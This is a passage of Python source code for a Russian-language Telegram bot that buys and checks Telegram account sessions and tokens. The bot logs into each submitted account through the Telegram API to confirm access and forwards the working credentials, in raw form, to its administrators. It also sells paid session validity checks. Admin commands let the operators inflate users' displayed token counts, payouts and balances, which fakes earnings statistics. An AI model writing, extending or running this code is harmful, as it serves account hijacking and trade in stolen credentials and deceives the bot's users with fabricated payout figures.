            await update.message.reply_html(f"{E_CHECK} Накручено <b>{cnt}</b> токенов пользователю <code>{uid}</code>.")
        except Exception:
            await update.message.reply_html(f"{E_WARN} Формат: <code>123456789 100</code>")
        USER_STATES.pop(user_id, None)

    elif step == "adm_fake_payout" and is_admin:
        try:
            parts = update.message.text.split()
            uid, amt = int(parts[0]), float(parts[1])
            db_update_stats(uid, 0, amt)
            await update.message.reply_html(f"{E_CHECK} Накручено <b>{amt:.2f} $</b> выплат пользователю <code>{uid}</code>.")
        except Exception:
            await update.message.reply_html(f"{E_WARN} Формат: <code>123456789 50.0</code>")
        USER_STATES.pop(user_id, None)

    elif step == "adm_fake_balance" and is_admin:
        try:
            parts = update.message.text.split()
            uid, amt = int(parts[0]), float(parts[1])
            db_add_balance(uid, amt)
            await update.message.reply_html(f"{E_CHECK} Начислено <b>{amt:.2f} $</b> баланса пользователю <code>{uid}</code>.")
        except Exception:
            await update.message.reply_html(f"{E_WARN} Формат: <code>123456789 10.0</code>")
        USER_STATES.pop(user_id, None)

    elif step == "topup_entering_amount":
        try:
            amount = float(update.message.text.replace(",", "."))
            if amount < 0.1: raise ValueError
        except Exception:
            await update.message.reply_html(f"{E_WARN} Введите сумму не меньше 0.1 $", reply_markup=cancel_button())
            return
        USER_STATES.pop(user_id, None)
        await update.message.reply_html(
            f"{E_PLUS} Сумма: <b>{amount:.2f} $</b>\n\nВыберите систему:",
            reply_markup=topup_method_buttons(amount)
        )

    elif step == "entering_count":
        text_content = update.message.text or ""
        if not text_content.isdigit() or int(text_content) <= 0:
            await update.message.reply_html(f"{E_WARN} Введите корректное число!", reply_markup=cancel_button())
            return
        state["count"] = int(text_content)
        state["step"] = "sending_tokens"
        await update.message.reply_html(
            f"{E_LOCK} <b>Количество: {state['count']} шт.</b>\n\nОтправьте файл сессий или токены текстом:",
            reply_markup=cancel_button()
        )

    elif step == "sending_tokens":
        category = state.get("category")
        count = state.get("count")
        raw_content = ""
        file_name = "text_message.txt"

        if update.message.document:
            doc = update.message.document
            file_name = doc.file_name or "file"
            file_obj = await context.bot.get_file(doc.file_id)
            file_bytes = await file_obj.download_as_bytearray()
            raw_content = file_bytes.decode('utf-8', errors='ignore')
        else:
            raw_content = update.message.text or ""

        extracted = extract_tokens(raw_content)
        if not extracted:
            await update.message.reply_html(f"{E_CROSS} <b>Не найдено токенов или сессий!</b>", reply_markup=cancel_button())
            return

        status_msg = await update.message.reply_html(
            f"🔄 <b>Проверяем вход в аккаунты по Telegram API...</b>\nЭто может занять некоторое время."
        )

        valid_tokens = []
        invalid_tokens = []

        # Быстрая параллельная проверка всех сессий
        tasks = [real_check_token_or_session(item) for item in extracted]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for item, res in zip(extracted, results):
            if isinstance(res, dict) and res.get("valid"):
                valid_tokens.append((item, res))
            else:
                reason = res.get("reason", "Ошибка входа") if isinstance(res, dict) else "Ошибка связи"
                invalid_tokens.append((item, {"reason": reason}))

        try:
            await status_msg.delete()
        except Exception:
            pass

        if not valid_tokens:
            USER_STATES.pop(user_id, None)
            reason_text = invalid_tokens[0][1].get("reason", "Не удалось войти") if invalid_tokens else "Ошибка сессии"
            await update.message.reply_html(
                f"{E_CROSS} <b>Вход не выполнен! Заявка отклонена.</b>\n\n"
                f"Все предоставленные сессии ({len(extracted)} шт.) невалидны, ключи сменены или отозваны.\n"
                f"<i>Причина: {reason_text}</i>",
                reply_markup=main_menu_buttons(is_admin)
            )
            return

        valid_raw = "\n".join([t[0] for t in valid_tokens])
        req_id = f"{user_id}_{update.message.message_id}"
        PENDING_TOKENS[req_id] = valid_raw

        await update.message.reply_html(
            f"{E_PARTY} <b>Проверка успешно пройдена!</b>\n\n"
            f"{E_CHECK} Успешных входов: <b>{len(valid_tokens)}</b> из <b>{len(extracted)}</b> шт.\n"
            f"Заявка отправлена администраторам на утверждение.",
            reply_markup=main_menu_buttons(is_admin)
        )

        adm_text = (
            f"{E_WARN} <b>НОВАЯ ПРОВЕРЕННАЯ ЗАЯВКА!</b>\n\n"
            f"{E_USER} <b>От:</b> @{user.username or 'NoUsername'}\n"
            f"<b>ID:</b> <code>{user_id}</code>\n"
            f"📁 Категория: <b>{category}</b>\n"
            f"🔢 Заявлено: <b>{count} шт.</b>\n"
            f"✅ Подтверждено входов: <b>{len(valid_tokens)} шт.</b>\n"
            f"📄 Имя файла: <code>{file_name}</code>"
        )

        for adm in ADMIN_IDS:
            try:
                if update.message.document:
                    await context.bot.send_document(
                        chat_id=adm, document=update.message.document.file_id,
                        caption=adm_text, parse_mode='HTML',
                        reply_markup=admin_approval_buttons(req_id, len(valid_tokens))
                    )
                else:
                    await context.bot.send_message(
                        chat_id=adm,
                        text=adm_text + f"\n\n💬 <b>Валидные ключи:</b>\n<code>{valid_raw[:400]}</code>",
                        parse_mode='HTML', reply_markup=admin_approval_buttons(req_id, len(valid_tokens))
                    )
            except Exception as e:
                logging.error(f"Ошибка отправки сообщения админу: {e}")
        USER_STATES.pop(user_id, None)

    elif step == "format_awaiting":
        raw_content = ""
        if update.message.document:
            doc = update.message.document
            file_obj = await context.bot.get_file(doc.file_id)
            raw_content = (await file_obj.download_as_bytearray()).decode('utf-8', errors='ignore')
        else:
            raw_content = update.message.text or ""

        toks = extract_tokens(raw_content)
        if not toks:
            await update.message.reply_html(f"{E_WARN} Не удалось найти токены.", reply_markup=cancel_button())
            return

        state["fmt_raw"] = raw_content
        state["step"] = "format_choose"
        cost = len(toks) * PRICE_PER_TOKEN
        await update.message.reply_html(
            f"{E_CHECK} <b>Найдено токенов: {len(toks)}</b>\n"
            f"{E_MONEY} Стоимость: <b>{cost:.2f} $</b>\n\n"
            f"{E_TOOLS} Выберите формат:",
            reply_markup=format_menu_buttons()
        )

    elif step == "check_awaiting":
        raw_content = ""
        if update.message.document:
            doc = update.message.document
            file_obj = await context.bot.get_file(doc.file_id)
            raw_content = (await file_obj.download_as_bytearray()).decode('utf-8', errors='ignore')
        else:
            raw_content = update.message.text or ""

        tokens_to_check = extract_tokens(raw_content)[:10]
        if not tokens_to_check:
            await update.message.reply_html(f"{E_WARN} Файл или сообщение пусты.", reply_markup=cancel_button())
            return

        cost = len(tokens_to_check) * PRICE_PER_TOKEN

        if not db_deduct_balance(user_id, cost):
            await update.message.reply_html(
                f"{E_WARN} <b>Недостаточно средств!</b>\n\n"
                f"Стоимость: <b>{cost:.2f} $</b>\nБаланс: <b>{db_get_balance(user_id):.2f} $</b>",
                reply_markup=InlineKeyboardMarkup([
                    [make_btn("Пополнить", "topup_balance", style="success")],
                    [make_btn("В меню", "main_menu", style="danger")]
                ])
            )
            return

        status_msg = await update.message.reply_html(f"⏳ <b>Выполняется подключение к Telegram и запуск сессий...</b>")

        tasks = [real_check_token_or_session(token) for token in tokens_to_check]
        check_responses = await asyncio.gather(*tasks, return_exceptions=True)

        results = []
        for token, res in zip(tokens_to_check, check_responses):
            if isinstance(res, dict):
                results.append((token, res))
            else:
                results.append((token, {"valid": False, "reason": "Ошибка входа"}))

        valid_count = sum(1 for _, res in results if res.get("valid"))
        invalid_count = len(results) - valid_count

        report_lines = []
        for tok, res in results:
            short = tok if len(tok) <= 25 else tok[:12] + "..." + tok[-8:]
            if res.get("valid"):
                info_text = res.get("info") or res.get("reason", "Валиден")
                report_lines.append(f"✅ <code>{short}</code> — {info_text}")
            else:
                reason = res.get("reason", "Невалидная сессия")
                report_lines.append(f"❌ <code>{short}</code> — {reason}")

        report = "\n".join(report_lines)
        USER_STATES.pop(user_id, None)
        
        try:
            await status_msg.delete()
        except Exception:
            pass

        await update.message.reply_html(
            f"{E_SEARCH} <b>Результаты входа на аккаунты:</b>\n\n"
            f"{E_CHECK} Авторизовано успешно: <b>{valid_count}</b>\n"
            f"{E_CROSS} Ошибок входа / Мертвых: <b>{invalid_count}</b>\n"
            f"{E_MONEY} Списано: <b>{cost:.2f} $</b>\n\n"
            f"<b>Детализация по сессиям:</b>\n{report}",
            reply_markup=check_result_buttons()
        )

# ==========================================
# 🏁 ЗАПУСК
# ==========================================

def main():
    logging.basicConfig(level=logging.INFO)
    init_db()

    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.job_queue.run_repeating(check_pending_invoices, interval=30, first=10)

    app.add_handler(CommandHandler("start", start_handler))
    app.add_handler(CommandHandler("admin", admin_handler))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, message_handler))

    print("Бот с РЕАЛЬНЫМ входом по Telegram API запущен!")
    app.run_polling()

if __name__ == "__main__":
    main()
